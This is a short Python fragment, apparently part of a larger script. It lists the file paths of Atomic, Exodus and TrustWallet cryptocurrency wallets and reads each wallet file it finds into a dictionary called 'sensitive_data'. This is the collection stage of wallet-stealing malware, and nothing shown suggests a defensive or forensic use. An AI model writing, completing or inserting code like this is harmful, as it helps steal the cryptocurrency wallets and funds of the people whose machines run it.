    wallet_files = [
        os.path.expanduser('~/.config/atomic/wallet.dat'),
        os.path.expanduser('~/.config/Exodus/exodus.wallet'),
        os.path.expanduser('~/.config/TrustWallet/wallet.json'),
        # ... other wallet file paths ...
    ]
    sensitive_data = {}
    for path in wallet_files:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                sensitive_data[path] = f.read()
